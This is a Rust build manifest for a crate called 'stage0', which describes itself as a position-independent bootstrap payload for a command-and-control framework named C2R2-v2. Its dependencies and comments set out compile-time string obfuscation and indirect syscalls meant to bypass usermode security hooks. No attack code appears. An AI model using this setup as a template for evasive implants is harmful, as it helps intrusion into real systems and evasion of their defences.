[package]
name = "stage0"
version = "2.0.0"
edition = "2021"
description = "Stage 3: Stage0 - Position-independent bootstrap payload for C2R2-v2"

[features]
default = ["dev"]
dev = []  # Development mode
production = []  # Production mode

[dependencies]
# String obfuscation at compile-time
obfstr = "0.4"
# Random number generation
rand = "0.8"
# TLS support - using ring backend to avoid MinGW/CMake requirements
rustls = { version = "0.23", default-features = false, features = ["std", "tls12", "ring"] }
webpki-roots = "0.26"

[target.'cfg(windows)'.dependencies]
winapi = { version = "0.3", features = [
    "winsock2",
    "ws2def",
    "errhandlingapi",
    "memoryapi",
    "processthreadsapi"
] }
# Indirect syscalls - dinvk provides DInvoke-style syscall execution
# Bypasses usermode hooks by dynamically resolving and executing syscalls
dinvk = "0.4"

[[bin]]
name = "stage0"
path = "src/main.rs"

[lib]
name = "stage0"
path = "src/lib.rs"

[profile.release]
# Optimize for size for position-independent code
opt-level = "z"
lto = true
codegen-units = 1
panic = "abort"
strip = true
